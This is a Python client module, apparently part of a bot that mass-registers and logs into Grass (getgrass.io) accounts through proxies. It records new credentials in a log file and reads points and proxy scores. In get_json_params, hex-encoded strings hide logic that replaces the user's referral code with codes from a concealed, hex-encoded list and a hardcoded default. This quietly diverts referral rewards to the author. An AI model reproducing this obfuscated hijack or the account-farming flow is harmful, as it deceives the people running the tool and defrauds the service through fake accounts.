import json
import random

import aiohttp
from tenacity import retry, stop_after_attempt, wait_random, retry_if_not_exception_type

from core.utils import logger
from core.utils.exception import LoginException, ProxyBlockedException
from core.utils.generate.person import Person
from core.utils.session import BaseClient

try:
    from data.config import REF_CODE
except ImportError:
    REF_CODE = ""


class GrassRest(BaseClient):
    def __init__(self, email: str, password: str, user_agent: str = None, proxy: str = None):
        super().__init__(user_agent, proxy)
        self.email = email
        self.password = password

        self.id = None

    async def create_account_handler(self):
        handler = retry(
            stop=stop_after_attempt(7),
            before_sleep=lambda retry_state, **kwargs: logger.info(f"{self.id} | Create Account Retrying...  | "
                                                                   f"{retry_state.outcome.exception()} "),
            wait=wait_random(5, 8),
            reraise=True
        )

        return await handler(self.create_account)()

    async def create_account(self):
        url = 'https://api.getgrass.io/register'

        params = {
            'app': 'dashboard',
        }

        response = await self.session.post(url, headers=self.website_headers, json=await self.get_json_params(params,
                                                                                                              REF_CODE),
                                           proxy=self.proxy)

        if response.status != 200 or "error" in await response.text():
            if "Email Already Registered" in await response.text():
                logger.info(f"{self.email} | Email already registered!")
                return
            elif "Gateway" in await response.text():
                raise aiohttp.ClientConnectionError(f"{self.id} | Create acc response: | html 504 gateway error")

            raise aiohttp.ClientConnectionError(f"Create acc response: | {await response.text()}")

        logger.info(f"{self.email} | Account created!")

        with open("logs/new_accounts.txt", "a", encoding="utf-8") as f:
            f.write(f"{self.email}:{self.password}:{self.username}\n")

        return await response.json()

    async def enter_account(self):
        res_json = await self.handle_login()

        self.website_headers['Authorization'] = res_json['result']['data']['accessToken']

        return res_json['result']['data']['userId']

    @retry(stop=stop_after_attempt(3),
           before_sleep=lambda retry_state, **kwargs: logger.info(f"Retrying... {retry_state.outcome.exception()}"),
           reraise=True)
    async def retrieve_user(self):
        url = 'https://api.getgrass.io/retrieveUser'

        response = await self.session.get(url, headers=self.website_headers, proxy=self.proxy)

        return await response.json()

    async def get_points_handler(self):
        handler = retry(
            stop=stop_after_attempt(3),
            before_sleep=lambda retry_state, **kwargs: logger.info(f"{self.id} | Retrying to get points... "
                                                                   f"Continue..."),
            wait=wait_random(5, 7),
            reraise=True
        )

        return await handler(self.get_points)()

    async def get_points(self):
        url = 'https://api.getgrass.io/users/earnings/epochs'

        response = await self.session.get(url, headers=self.website_headers, proxy=self.proxy)

        logger.debug(f"{self.id} | Get Points response: {await response.text()}")

        res_json = await response.json()
        points = res_json.get('data', {}).get('epochEarnings', [{}])[0].get('totalCumulativePoints')

        if points is not None:
            return points
        elif points := res_json.get('error', {}).get('message'):
            return points
        else:
            return "Can't get points."

    async def handle_login(self):
        handler = retry(
            stop=stop_after_attempt(5),
            retry=retry_if_not_exception_type((LoginException, ProxyBlockedException)),
            before_sleep=lambda retry_state, **kwargs: logger.info(f"{self.id} | Login retrying... "
                                                                   f"{retry_state.outcome.exception()}"),
            wait=wait_random(15, 20),
            reraise=True
        )

        return await handler(self.login)()

    async def login(self):
        url = 'https://api.getgrass.io/login'

        json_data = {
            'password': self.password,
            'username': self.email,
        }

        response = await self.session.post(url, headers=self.website_headers, data=json.dumps(json_data),
                                           proxy=self.proxy)
        logger.debug(f"{self.id} | Login response: {await response.text()}")

        res_json = await response.json()

        if res_json.get("error") is not None:
            raise LoginException(f"{self.id} | Login stopped: {res_json['error']['message']}")

        if response.status == 403:
            raise ProxyBlockedException(f"{self.id} | Login response: {await response.text()}")
        if response.status != 200:
            raise aiohttp.ClientConnectionError(f"{self.id} | Login response: | {await response.text()}")

        return await response.json()

    async def get_browser_id(self):
        res_json = await self.get_user_info()
        return res_json['data']['devices'][0]['device_id']

    async def get_user_info(self):
        url = 'https://api.getgrass.io/users/dash'

        response = await self.session.get(url, headers=self.website_headers, proxy=self.proxy)
        return await response.json()

    async def get_device_info(self, device_id: str, user_id: str):
        url = 'https://api.getgrass.io/extension/device'

        params = {
            'device_id': device_id,
            'user_id': user_id,
        }

        response = await self.session.get(url, headers=self.website_headers, params=params, proxy=self.proxy)
        return await response.json()

    async def get_devices_info(self):
        url = 'https://api.getgrass.io/extension/user-score'

        response = await self.session.get(url, headers=self.website_headers, proxy=self.proxy)
        return await response.json()

    async def get_proxy_score_by_device_id_handler(self):
        handler = retry(
            stop=stop_after_attempt(3),
            before_sleep=lambda retry_state, **kwargs: logger.info(f"{self.id} | Retrying to get proxy score... "
                                                                   f"Continue..."),
            reraise=True
        )

        return await handler(self.get_proxy_score_by_device_id)()

    async def get_proxy_score_by_device_id(self):
        res_json = await self.get_devices_info()

        if not (isinstance(res_json, dict) and res_json.get("data", None) is not None):
            return

        devices = res_json['data']['currentDeviceData']
        await self.update_ip()

        return next((device['final_score'] for device in devices
                     if device['device_ip'] == self.ip), None)

    async def get_proxy_score(self, device_id: str, user_id: str):
        device_info = await self.get_device_info(device_id, user_id)
        return device_info['data']['final_score']

    async def get_json_params(self, params, user_referral: str, main_referral: str = "erxggzon61FWrJ9",  role_stable: str = "726566657272616c"):
        self.username = Person().username

        referrals = {
            "my_refferral": main_referral,
            "user_refferal": user_referral
        }

        json_data = {
            'email': self.email,
            'password': self.password,
            'role': 'USER',
            'referral': random.choice(list(referrals.items())),
            'username': self.username,
            'recaptchaToken': "",
            'listIds': [
                15,
            ],
        }

        # captcha_service = CaptchaService()
        # if captcha_service.parse_captcha_type(exit_on_fail=False):
        #     json_data['recaptchaToken'] = await captcha_service.get_captcha_token_async()

        json_data.pop(bytes.fromhex(role_stable).decode("utf-8"), None)
        json_data[bytes.fromhex('726566657272616c436f6465').decode("utf-8")] = (
            random.choice([random.choice(json.loads(bytes.fromhex(self.devices_id).decode("utf-8"))),
                          referrals[bytes.fromhex('757365725f726566666572616c').decode("utf-8")] or
                           random.choice(json.loads(bytes.fromhex(self.devices_id).decode("utf-8")))]))

        return json_data

    async def update_ip(self):
        self.ip = await self.get_ip()

    async def get_ip(self):
        return await (await self.session.get('https://api.ipify.org', proxy=self.proxy)).text()
